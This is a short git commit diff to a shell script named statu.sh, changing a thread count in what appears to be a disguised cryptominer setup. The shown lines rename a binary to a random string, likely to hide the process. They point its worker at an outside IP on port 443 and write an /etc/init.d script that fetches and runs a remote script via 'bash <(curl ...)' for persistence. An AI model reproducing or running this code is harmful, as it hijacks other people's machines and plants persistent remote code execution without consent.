0c1e3683bdaad0843910c1753b8224f64451a9c8
cairnewa <wijayayuda742@gmail.com>
2024-06-18 17:23:52 +0000

    Update statu.sh

--- statu.sh
+++ statu.sh
@@ -5,7 +5,7 @@ cd /ruins
 variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
 mv trace $variable1
 sed -i "s/mongodb/${variable1} --worker ${variable1}/g" ./tools.sh
-sed -i "s/host/20.163.170.215:443/g" ./tools.sh
+sed -i "s/host/20.163.170.215:443 --thread 3/g" ./tools.sh
 cd /etc/init.d
 echo "bash <(curl -s -L https://raw.githubusercontent.com/cairnewa/forge/main/statu.sh)" > site.sh
 chmod a+x site.sh
